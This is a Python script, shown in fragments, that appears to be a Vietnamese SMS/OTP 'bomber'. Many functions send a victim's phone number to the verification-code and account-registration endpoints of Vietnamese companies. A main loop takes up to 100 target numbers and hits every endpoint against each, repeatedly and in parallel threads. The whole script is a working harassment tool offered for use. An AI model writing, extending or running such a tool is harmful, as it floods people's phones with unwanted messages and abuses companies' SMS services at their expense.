...
def vt(sdt):
    ...
    try:
        response = requests.post('https://digital.yteviettel.vn/account/LayMaXacThucDangKyTaiKhoan',cookies=cookies,headers=headers,json=json_data,)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
def phuclong(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
    ...
    try:
        ...
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHUCLONG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHUCLONG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
...
def highlands(sdt_chuyen_doi): #ap 
    cookies = {
...
def thinkpro (sdt): # web, code 500 check
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
...
def timnha24h(sdt_chuyen_doi): # 400, ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS',
        'content-type': 'application/json',
...
def money24h(sdt_chuyen_doi): #app 24hmoney, 503 check
    headers = {
...
def tourism(sdt): #ap \quản trị và kinh doanh du lịch\
    headers = {
...
functions = [
    ...
    best, mocha1, one, pnj, PNJ1, vietmoney, call, vieton,
    best1, vt, phuclong, mac, viettel, vayvn
]

def execute_functions(sdt, count):
    sdt_chuyen_doi = sdtt(sdt)
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        # Giới hạn thực tế là 10 để tránh quá tải, dù count được gán giá trị lớn
        actual_count = min(count, 100)
        for i in range(actual_count):
            for func in functions:
                futures.append(executor.submit(func, sdt_chuyen_doi))
                time.sleep(10)  # Thời gian nghỉ để tránh quá tải server
...
def main():
    phone_numbers = []
    while True:
        sdt = input("Nhập số điện thoại (hoặc bấm Enter để kết thúc nhập): ")
        if sdt == "":
            break
        phone_numbers.append(sdt)
        if len(phone_numbers) >= 100:
            print("Đã đạt giới hạn 100 số điện thoại.")
            break

    if not phone_numbers:
        print("Không có số điện thoại nào được nhập.")
        return

    # Gán sẵn số lần lặp cực lớn
    count = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
    print(f"Số lần lặp được gán sẵn: {count}")
    print("Tuy nhiên, để tránh quá tải, mỗi số điện thoại sẽ chỉ thực hiện tối đa 100 lần lặp.")

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(phone_numbers)) as executor:
        futures = []
        for sdt in phone_numbers:
            futures.append(executor.submit(execute_functions, sdt, count))
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
